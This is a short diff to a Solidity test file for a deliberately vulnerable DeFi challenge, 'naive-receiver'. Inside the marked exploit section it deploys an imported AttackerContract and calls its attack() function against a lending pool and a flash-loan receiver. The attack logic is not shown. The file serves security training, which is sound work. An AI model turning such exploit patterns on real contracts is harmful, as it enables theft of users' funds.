@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
+import {AttackerContract} from "../../../src/Contracts/naive-receiver/solution/AttackerContract.sol";
 
 contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -48,6 +49,13 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        AttackerContract attackerContract = new AttackerContract(
+            address(naiveReceiverLenderPool),
+            address(flashLoanReceiver)
+        );
+        attackerContract.attack();
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
